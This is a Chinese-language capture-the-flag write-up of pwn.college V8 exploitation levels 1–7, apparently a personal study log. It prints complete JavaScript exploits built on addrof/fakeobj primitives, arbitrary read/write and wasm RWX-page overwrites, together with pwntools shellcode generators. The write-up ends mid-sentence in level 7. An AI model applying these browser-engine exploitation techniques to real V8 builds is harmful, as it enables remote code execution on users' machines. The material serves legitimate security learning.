# Practice-Pwncollege

https://pwn.college/quarterly-quiz/v8-exploitation 提供了一些练习，需要注册账号。每道题目都有start和practice选项，区别在于practice提供的环境可以用sudo。我刚开始没意识到这点，准备调试d8的时候提示permission denied。加个sudo就解决了

题目提供的环境自带pwndbg，不过要用`pwndbg`命令唤起，而不是`gdb`。环境的workspace和desktop是互通的，在workspace里改动的文件能在desktop里看到，反之亦然

## level1

整个patch文件都是bug，将double数组里的元素拷贝到mmap的一块rwx内存后执行。直接生成shellcode后转成double类型即可
```py
from pwn import *
import struct
context.arch='amd64'
shellcode=asm(shellcraft.execve('/challenge/catflag', 0, 0))
exp=[]
for i in range(0,len(shellcode),8):
    exp.append(struct.unpack('d', shellcode[i:i+8].ljust(8,b'\x00'))[0])
print(exp)
```
```js
let shellcode=[2.820972645905851e-134, 3.0758087950517603e+180, 2.2354425876138794e+40, 3.68572438550025e+180, 1.054512194375715e-68, 2.748715909248e-311];
shellcode.run();
```
注意shellcode要执行题目自带的`catflag`而不是sh

## level2

这回总算知道了什么是“像噩梦一样”

patch文件提供了三个函数，`GetAddressOf`,`ArbRead32`和`ArbWrite32`。`GetAddressOf`返回的是对象压缩后的指针（即相对于基地址的偏移）；`ArbRead32`和`ArbWrite32`的参数也是压缩后的指针

这题的设置很像教程Part 6里的内容，甚至更简单了一点，不需要自己制造“任意”地址读写的函数，题目已经准备好了。只需要用ArrayBuffer将压缩指针的任意地址写提升成全局任意地址写即可

……然后噩梦就开始了。我根据教程里的说法用`%DebugPrint`+while无限循环调试，捣鼓了好一会终于成功了。但是`%DebugPrint`只有开启`--allow-natives-syntax`才能用，而实战环境里是没有的，所以我得去掉这句。但是v8 pwn和平时搞的linux pwn不同，非常不稳定。只要我改动一点，比如删除某行或者添加某行代码，泄漏地址的偏移就不一样了。现在问题来了，我得用`%DebugPrint`才能知道wasm_instance的地址从而计算泄漏的偏移，但是实战环境不能用；我又没办法算没有`%DebugPrint`时的偏移。这不就卡死了？

后面想了个别的方法。用`%DebugPrint`可以得到wasm_instance的地址，而wasm_instance内含有一些特殊的字节。这些字节在脚本每次运行时都一样，无论有没有`%DebugPrint`。所以在pwndbg里对这些字节用`search -x`(其实直接`search -p`就行，还不用手动转端序)就能在无`%DebugPrint`的情况下找到wasm_instance的地址了

还有一点是js里的整数。`ArbRead32`一次只能读32 bit，所以想要泄漏wasm的RWX内存地址要读两次。假设上半部分叫upper，下半部分叫lower，那么完整地址是`(upper<<32)|lower`对吧（至少python里是的）？结果js里因为整数带符号，出来的结果乱七八糟。后面我尝试套了一层BigInt，把`|`换成`+`，行了。不确定这是不是最好的办法，总之能用
```js
function shift32(i) {
	return i << 32n;
}
WASM_PAGE_UPPER_OFFSET = 0x2c35c;
WASM_PAGE_LOWER_OFFSET = 0x2c358;
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
let upper=BigInt(ArbRead32(GetAddressOf(wasm_instance)+WASM_PAGE_UPPER_OFFSET));
let lower=BigInt(ArbRead32(GetAddressOf(wasm_instance)+WASM_PAGE_LOWER_OFFSET));
let leak = shift32(upper)+lower;
console.log(leak);
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(buf);
let buf_addr = GetAddressOf(buf);
let backing_store_addr = buf_addr + 0x24;
ArbWrite32(backing_store_addr,Number(lower));
ArbWrite32(backing_store_addr+4,Number(upper));
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
```
shellcode的生成如下：
```py
from pwn import *
import struct
context.arch='amd64'
def bytes_to_int32_array(data, byte_order='little'):
    if len(data) % 4 != 0:
        raise ValueError("字节长度必须是4的倍数")
    format_char = 'I'
    if byte_order == 'little':
        fmt = f'<{len(data)//4}{format_char}'
    else:
        fmt = f'>{len(data)//4}{format_char}'
    return list(struct.unpack(fmt, data))
data = asm(shellcraft.execve('/challenge/catflag', 0, 0))
if len(data)%4!=0:
    data+=b'\x00'*(4-len(data)%4)
integers = bytes_to_int32_array(data, byte_order='little')
print(integers)
```
## level3

开始上难度了。这题提供的`GetAddressOf`与上一题相同，另外一个功能是`GetFakeObject`，用于在指定地址（tageed compressed pointer）创建一个heapObject并返回。没啥头绪，但是找到了一篇比较像的wp： https://faraz.faith/2019-12-13-starctf-oob-v8-indepth 。那道题的漏洞是数组越界写（和教程Part 6差不多），也是通过构造fake object来实现任意地址读写然后写shellcode

教程Part 5提到“v8里几乎所有东西都是HeapObject”。这意味着数组也不例外。数组内部的结构参考教程Part 6里的“图” `begin victim`那部分。可以发现就四个内容：`map ptr`，`properties ptr`,`backing store ptr`和`length of array `（各个字段的顺序不同版本不一样，但总归就这四个东西）。这里我又参考了上面那篇wp，发现数组读写只关乎于`map ptr`和`backing store ptr`(即数组元素)。于是可以利用`GetFakeObject`伪造具有任意`backing store ptr`的“数组”，实现相对于基地址的任意地址读写，后续就和上一题一样了

最开始想着完全自己伪造一个数组。但是`map ptr`指向的内容太复杂，不可能。遂参考wp，沿用一个已知数组的`map ptr`即可。map的类型决定数组该如何进行数据读写，因此这里用float（double）数组的map，可以进行64位的读写。而且虽然说只有两个字段重要，我在脚本里也把其他字段按照正常数组的结构补上了。可能没啥用，但至少程序崩溃时我可以少看一个地方

还有一点是，wp“年代久远”，当时v8还没有指针压缩机制。因此用来构造fake object的`arb_rw_arr`中有四个元素。现在只需要两个就好了。同理，拿`map ptr`时也从同样有两个元素的float数组拿。这里我也不确定是不是必须的，但伪造的内容多点总没有坏处
```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function shift32(i) {
	return i << 32n;
}
RWX_PAGE_OFFSET=0x2c0fc;
ELEMENTS_OFFSET=-0x10
var float_arr = [1.1, 1.2];
var float_arr_map = GetAddressOf(float_arr)+0x187fbd;
var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_arr_map)), 1.2];
function arb_read(addr) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8));
    let fake = GetFakeObject(GetAddressOf(arb_rw_arr)+ELEMENTS_OFFSET);
    return ftoi(fake[0]);
}
function arb_write(addr, val) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8));
    let fake = GetFakeObject(GetAddressOf(arb_rw_arr)+ELEMENTS_OFFSET);
    fake[0] = itof(BigInt(val));
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(GetAddressOf(wasm_instance)+RWX_PAGE_OFFSET+1);
console.log(rwx_page_addr);
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(shellcode_buf);
let buf_addr = GetAddressOf(shellcode_buf);
let backing_store_addr = buf_addr + 0x25;
arb_write(backing_store_addr,rwx_page_addr);
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
while(1){}
```
`GetAddressOf(arb_rw_arr)`获取`arb_rw_arr`的地址后找到其元素的起始地址作为fake object的地址。`addr-8`是因为数组并不直接从`backing store ptr`起始处进行读写，而是`backing store ptr`+8。这点可以通过DebugPrint一个正常的数组并查看其`backing store ptr`与元素实际存储的位置确定

以及我的脚本写得很乱，难以区分参数到底是tagged pointer还是普通pointer。这题不复杂所以我没晕，但感觉再不改掉这个习惯就要晕了

最后是不得不品的调试环节。它竟然能这么不稳定。上一题发现增减语句会导致偏移不对，没想到怎么唤起的d8也能影响偏移。我的exp首先在pwndbg里打印出了flag，但运行run时不行。最后在脚本末尾加了句`while(1){}`，然后用pwndbg attach找的偏移

还好这题会变的偏移其实只有两个，float_arr_map的偏移和rwx_page_addr的偏移。我一直习惯一步完成后再写下一步，但放到v8里会非常痛苦。第一步成功后去写第二步，写完后第一步废了；改完后去写第三步，写完后第一步第二步全废了……不断循环。这题exp的逻辑很清晰，所以更好的做法应该是先一次写完exp，标记会变的偏移后再用一次调试确定全部的偏移。但这个做法后续题目复杂了就不好用了吧，至少我是绝对没有一次完成exp全部步骤的能力的

## level4

patch文件提供了`setLength`函数，允许将数组的长度改为任意值。和上一题很像，几乎完全等于 https://faraz.faith/2019-12-13-starctf-oob-v8-indepth 和教程Part 6的情景。不过我不太喜欢Part 6提供的exp的`arrays[2]`数组定义方式，遂跟着上周就看过的wp做。那篇wp只能oob一个索引，而这题拥有无限的oob，所以可以简化一点它的做法
```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function shift32(i) {
	return i << 32n;
}
function lowerhalf(i) {
	return i % 0x100000000n;
}
RWX_PAGE_OFFSET=0x2c233n;
var float_arr = [1.1];
var obj = {"A":1};
var obj_arr = [obj];
float_arr.setLength(11);
var float_arr_map = ftoi(float_arr[1]);
var obj_arr_map = ftoi(float_arr[10]);
console.log(float_arr_map);
console.log(obj_arr_map);
var something=[1.2];
something.setLength(3);
function addrof(in_obj) {
    obj_arr[0] = in_obj;
    float_arr[10]=itof(float_arr_map);
    let addr = obj_arr[0];
    float_arr[10]=itof(obj_arr_map);
    return lowerhalf(ftoi(addr));
}
function arb_read(addr) {
    float_arr[2]=itof(shift32(2n)+BigInt(addr-8n));
    return ftoi(float_arr[0]);
}
function arb_write(addr, val) {
    something[2]=itof(shift32(2n)+BigInt(addr-8n));
    something[0] = itof(val);
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
let buf_addr = addrof(shellcode_buf);
var rwx_page_addr = arb_read(addrof(wasm_instance)+RWX_PAGE_OFFSET+1n);
console.log(rwx_page_addr);
console.log(buf_addr);
let backing_store_addr = buf_addr + 0x24n;
arb_write(backing_store_addr,rwx_page_addr);
let dataview = new DataView(shellcode_buf);
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
while(1){}
```
脚本中的`arb_read`和`arb_write`均只能调用一次。本来出现oob的数组（float_arr）是用来覆盖相邻的下一个数组的elements指针的，我直接改了float_arr自己的elements……导致我在写arb_write卡了很久，完全没意识到我用的还是float_arr。float_arr在调用arb_read时已经“坏”了，通过写elements已无法修改数组结构（elements现在是arb_read的参数，自然无法二次修改数组结构）。我懒得重新布局，于是将错就错，额外给arb_write加了个something数组。此举没有扰乱之前float_arr和obj_arr的布局，加上arb_read和arb_write都只需要用一次，侥幸过关

过程中遇见了一个很无语的事。在我构造好addrof primitive后，能正常泄漏出wasm_instance的地址，但泄漏不出shellcode_buf的地址。调试了很久都不知道哪里有问题。去服务器搜了一下，发现其他人也有类似的问题，有时能行有时不能行，竟然属于正常现象。后面我修改了两者的泄漏顺序（最开始是先`addrof(wasm_instance)`再`addrof(shellcode_buf)`），奇迹般地跑起来了

另外，环境好像变了。现在直接运行`sudo pwndbg`会提示没有PATH变量。用`sudo env PATH="$PATH" pwndbg`即可

## level5

感觉level4没什么新东西，于是这周再做一题

这题的漏洞函数为`offByOne`，这下完全等于那篇看包浆的wp了。但这题多了一个额外的难点：仅double数组可以触发`offByOne`，object数组不行。因此无法像那篇wp一样直接泄漏object map，偏偏object map是最重要的内容之一

数组一般遵循`elements | array object`的布局，意味着`offByOne`只能越界到自身数组的map。此时的我没有任何头绪，于是去社区服务器搜了一下相关内容。真的有人问过和我一样的问题，`kylebot1337`佬是这样回答的：
```
so, JSObject and elements are two different things 
JSObject is of size 0x10
when you do var a = [1.1, 2.2, 3.3]
what actually happens is that it will allocate all the elements (1.1, 2.2, 3.3), and then finally allocate the JSObect
so, normally on heap, you have elements | object
that's why you thought you could only overflow into the double array itself
but no
what if you increase the number of elements?
since there is no way to hold it in the original location, it has to be reallocated
leading to this heap layout: old_elements | object | elements | victim
```
（虽然后面我好像没有完全按照这个思路写，因为不知道怎么搞，但是还是给了我启发）

关键在于：
1. 让elements跑到array object后面
2. 让elements与victim object相邻

第一点很简单，之前无意中发现过。用`var a=[1.1,1.2]`定义的话，元素在array object前面；但是用`var a=Array(1.1,1.2)`的话就跑到后面去了。第二点卡了我好一会，因为object数组好像不遵循我在double数组上发现的规律，用`Array`不改变元素与数组的先后顺序，或是中间会出现某些不知道的结构隔开victim和elements（不过后面好像反应过来这所谓“不知道的结构”究竟是什么东西了……但懒得重新调试确认）

读了佬的提示好多遍，注意到`it will allocate all the elements (1.1, 2.2, 3.3), and then finally allocate the JSObect`。嗯？那我要是定义一个没有任何元素的数组，然后再往里面push一个object呢？没想到竟然成了，而且因为数组里只有一个object，其map确实是我想要的object map
```js
RWX_PAGE_OFFSET=0x2c16bn;
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function shift32(i) {
	return i << 32n;
}
function lowerhalf(i) {
	return i % 0x100000000n;
}
var obj = {"A":1};
var float_arr=Array(1.1,1.2);
var obj_arr=[];
obj_arr.push(obj);
var obj_arr_map=ftoi(float_arr.offByOne());
console.log(obj_arr_map);
var oob=Array(1.1,1.2)
var victim=[];
victim.push(1.1,1.2);
var float_victim_map = ftoi(oob.offByOne());
console.log(float_victim_map);
var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_victim_map)), 1.2];
function addrof(in_obj) {
    obj_arr[0] = in_obj;
    float_arr.offByOne(itof(float_victim_map));
    let addr = obj_arr[0];
    float_arr.offByOne(itof(obj_arr_map));
    return lowerhalf(ftoi(addr));
}
function fakeobj(addr) {
    victim[0] = itof(addr);
    oob.offByOne(itof(obj_arr_map));
    let fake = victim[0];
    oob.offByOne(itof(float_victim_map));
    return fake;
}
function arb_read(addr) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
    return ftoi(fake[0]);
}
function arb_write(addr, val) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
    fake[0] = itof(BigInt(val));
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
let buf_addr = addrof(shellcode_buf);
let wasm_addr=addrof(wasm_instance);
console.log(wasm_addr);
var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET+1n);
console.log(rwx_page_addr);
console.log(buf_addr);
let backing_store_addr = buf_addr + 0x24n;
arb_write(backing_store_addr,rwx_page_addr);
let dataview = new DataView(shellcode_buf);
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
while(1){}
```
一些踩过的坑：
- `var obj = {"A":1};`的定义要在最上面，防止破坏接下来多个数组的布局。最开始我完全意识不到这点，放在float_arr和obj_arr之间定义。即使随便一个obj也是要占空间的，故会扰乱布局，隔开本来是相邻的两个结构
- 提示里的`increase the number of elements`有点误导我，或者是我没读明白。我最开始的构想是定义一个`var a=[1.1]`，然后往里面push元素。我看过原本的布局，元素和数组object时间没有任何空间，所以push肯定会触发reallocation。实测发现它确实reallocate了，但是reallocate的数量不等于我push的数量，而是多分配了很多个元素的空间。估计是某种动态预分配机制
- 了解到上一条后我还不死心，有了个更复杂的想法。定义一个object数组，其elements占用的内存正好等于预分配需要的最大空间。然后往object数组里push object，触发reallocation；最后再往double数组里push数字，同样触发reallocation。我以为触发reallocation后装之前的元素的内存就会被回收，就能被接下来的预分配占用了。首先垃圾处理器不是这么想的（并没有被回收），其次虽然说预分配了n个元素的位置，但offByOne看的是length，而预分配不会修改length

## level6

patch提供了一个数组的方法，名为`ArrayFunctionMap`。该函数允许攻击者遍历double数组的元素并调用任意回调函数，参数为数组元素。叫deepseek帮忙分析了一波（其实之前一直都是ds帮我分析的……），说是调用回调函数时没有锁定数组，导致回调函数内部可以修改数组。不过具体怎么修改和利用ds说不出来

去社区服务器逛了一圈，找到了这篇[wp](https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc)。虽然提供的函数功能与这题完全不同，但都是增加了数组的方法，且内部也没看见有关锁数组的操作。盯着wp看了好一会（并没有在阅读），发现wp存在在回调函数里将double数组中的一个元素设置为object的操作。好的我猜ds说的就是这个，wp懒得看了，让我自己玩玩

注意到上述操作会使数组的map从普通的double map变成object map，即数组不再是double array了。暂时没用。接着看了会数组的内存布局，发现使用object map后一个元素就只占32位了。很好的发现，但是还是用不上。换个东西盯，这次仔细地看`ArrayFunctionMap`的实现。发现它在读取和设置数组元素时都使用了`Cast<FixedDoubleArray>`。结合之前的发现，突然有了思路
```js
RWX_PAGE_OFFSET=0x2c0f3n;
MAP_OFFSET=0x187f60n;
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function shift32(i) {
	return i << 32n;
}
function upperhalf(i) {
	return i / 0x100000000n;
}
function fakeobj(addr){
    var float_arr=[1.1];
    float_arr.functionMap(()=>{
        float_arr[0]={};
        return itof(addr);
    });
    return float_arr[0];
}
function addrof(in_obj) {
    var float_arr=[1.1,1.2,1.3,1.4];
    var addr=0n;
    var i=0;
    float_arr.functionMap((element)=>{
        if(i==0) float_arr[3]=in_obj;
        else if(i==1) addr=ftoi(element);
        i++;
        return element;
    });
    return upperhalf(addr);
}
var float_map_arr=[6.6];
var float_map_arr_addr=addrof(float_map_arr);
var float_arr_map = float_map_arr_addr+MAP_OFFSET;
console.log(float_map_arr_addr);
var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_arr_map)), 1.2];
function arb_read(addr) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
    return ftoi(fake[0]);
}
function arb_write(addr, val) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
    fake[0] = itof(BigInt(val));
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
let buf_addr = addrof(shellcode_buf);
let wasm_addr=addrof(wasm_instance);
var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET+1n);
console.log(rwx_page_addr);
let backing_store_addr = buf_addr + 0x24n;
arb_write(backing_store_addr,rwx_page_addr);
let dataview = new DataView(shellcode_buf);
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
while(1){}
```
`fakeobj` primitive很容易构造。由于`ArrayFunctionMap`缺少关于数组类型实时的检查，直接把`addr`当成double数组的浮点数写进了object数组。导致最后取`float_arr[0]`即可拿到任意地址代表的object

`addrof` primitive则有点蒙的成分。`addrof`primitive的原理是将object按照double map的读法读出来，因为object存储在数组里时存储的是自身的地址。碰巧`ArrayFunctionMap`会传给回调函数当前元素，只需在i（估计得是偶数。不过记为i也就看个乐呵，实际上除了0以外不可能用别的，太麻烦）索引时提前将i+3（`ArrayFunctionMap`里还是将数组元素按照double读取，因此一次读64位，区别于object数组一个元素只有32位）索引处的元素替换为object，后续i+1收到的参数就是object的地址。不过按照我的理解，最后返回的应该是`lowerhalf(addr)`，但实测地址在upperhalf。hmmmmm，我又漏了啥？

另外环境又改回来了，没有PATH变量的问题。估计之前是我自己不小心把环境搞没的（

## level7

与前几题相比，难度曲线突然直线上升，其中调试占大头。我以为经过前几题的洗礼自己已经习惯并摸清一点规律了，没想到事实是连门槛都没摸到

这题的patch内容不明显。问了deepseek，说是“注释掉了所有与 map 检查失败时触发 deoptimization 相关的代码”。复习了教程Part 5里的内容，分析出题目的漏洞如下：
- 假设我定义了一个有参数的函数func
- 连续调用上述函数多次，并保证传入的参数类型（对象的map）为A。此举会触发optimization，使v8推断func的参数类型就是A
- 调用函数func，但传入类型为B的参数。这里由于传入的参数类型与先前的推断不符，会触发Deoptimization
- 但patch将Deoptimization的逻辑去掉了，于是出现了类型混淆。即使传入的参数类型是B，函数内仍然将其按照类型A操作

我的第一个思路如下：
- 定义两个函数test和test2，在触发optimization过程时一个传double数组，一个传object数组
- 用test构造addrof primitive。因为即使我们传入object数组，test内部仍将其看作double数组，便能直接读出object在数组中记录的地址
- test2则是反过来，构造fakeobj primitive。即使我们传入double数组，test内部仍将其看作object数组，于是取出的是指定地址处的fakeobject

这里注意，在优化后的函数里使用`%DebugPrint`查看参数会发现它们的map其实是正确的。我一度以为这里的类型混淆指的是v8整体判断错了某个object的map类型（`%DebugPrint`会输出错误的map），但根据chatgpt的说法，应该是被优化的函数内部“存在针对双精度数组的优化路径”。根据后续的表现，我猜测是函数内部不再实时判断传入的参数的map类型，类似“缓存”的概念；缓存参数的map后便直接按照缓存的方式处理，无视参数本来的map类型（但是懒得验证，不想看v8源码）

`--trace-opt`可以查看v8是否优化了某个函数。如果打印的日志里包含`completed optimizing 0xaddr <JSFunction func (sfi = x)> (target TURBOFAN) OSR]`，则v8优化了名为`func`的函数。函数推断的参数类型可以用`%DebugPrint(func)`查看。假如出现类似下面的内容：
```
 - slot #0 CompareOp CompareOp:SignedSmall {
     [0]: 1
  }
 - slot #1 LoadKeyed MONOMORPHIC
   [weak] 0x3935001cb7f9 <Map[16](PACKED_DOUBLE_ELEMENTS)>: LoadHandler(Smi)(kind = kElement, allow out of bounds = 0, is JSArray = 1, alow reading holes = 0, elements kind = PACKED_DOUBLE_ELEMENTS) {
     [1]: [weak] 0x3935001cb7f9 <Map[16](PACKED_DOUBLE_ELEMENTS)>
     [2]: 4352
  }
```
就说明函数推断的参数类型为`PACKED_DOUBLE_ELEMENTS`，即double数组

到这里，我成功在pwndbg中得到了flag。“后续只需要跳出pwndbg再调试一些偏移就可以了吧”，我是这么想的。结果我低估了v8的邪恶。我发现exp无论如何都读不出来rwx_page_addr，但也不报错，就那样卡在那里，留给我一个诡异的`0x7ff8000000000000`。我仍然不知道这个值是哪里来的，不过根据之前的经验，这样一般是fake object的map错了。然而我调试了无数次，只能得出“map的地址没错，类型也是double数组”的结论。然后又调试了很久，终于发现问题是fakeobj primitive失效了。`--trace-opt`显示v8并没有优化test2函数。布什戈门，在pwndbg里不是优化得很好吗？怎么出了pwndbg后就莫名其妙不优化了？脚本我明明一个字没动？我怀疑过是函数调用的次数不够，甚至怀疑是v8不会优化参数为object数组类型的函数。结果却非常出乎意料：v8只会优化第一个函数

……

我尝试调换过test和test2调用的顺序，结果变成了test2被优化而test无论如何都不会被优化。如果只用一个for循环同时调用两个函数，则两者都不会被优化。更莫名其妙的是，相同的环境和脚本，第一次运行脚本不会被优化，后续再运行就可以了。完全不明白为什么……

所以需要只用一个函数实现两个primitive。好像也不难，便有了下方的exp：
```js
RWX_PAGE_OFFSET=0x2c188n;
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function shift32(i) {
	return i << 32n;
}
function lowerhalf(i) {
	return i % 0x100000000n;
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
function optimize_me_please(arr,value,is_write){
    if(is_write) arr[0]=value;
    return arr[0];
}
var float_arr=[73.31];
for (var huh=0; huh < 200000000; huh++) {
    optimize_me_please(float_arr,13.37,true);
}
function addrof(in_obj) {
    var evil=[in_obj];
    return lowerhalf(ftoi(optimize_me_please(evil,1.1,false)));
}
function fakeobj(addr){
    var obj = {"A":1};
    var evil=[obj,obj];
    optimize_me_please(evil,itof(addr),true);
    return evil[0];
}
var arb_rw_arr = [itof(shift32(0x725n)+BigInt(0x1cb7f9)), 1.2];
var arb_rw_arr_addr=addrof(arb_rw_arr);
console.log(arb_rw_arr_addr);
console.log(fakeobj(arb_rw_arr_addr));
console.assert(fakeobj(arb_rw_arr_addr)[1]==arb_rw_arr[1]);
function arb_read(addr) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
    let fake = fakeobj(arb_rw_arr_addr+0x18n);
    return ftoi(fake[0]);
}
function arb_write(addr, val) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
    let fake = fakeobj(arb_rw_arr_addr+0x18n);
    fake[0] = itof(BigInt(val));
}
let wasm_addr=addrof(wasm_instance);
console.log(wasm_addr);
var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET);
console.log(rwx_page_addr);
let buf_addr = addrof(shellcode_buf);
let backing_store_addr = buf_addr + 0x24n;
arb_write(backing_store_addr,rwx_page_addr);
let dataview = new DataView(shellcode_buf);
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
while(1){}
```
这我就不得不列出v8（和我）神奇的操作了：
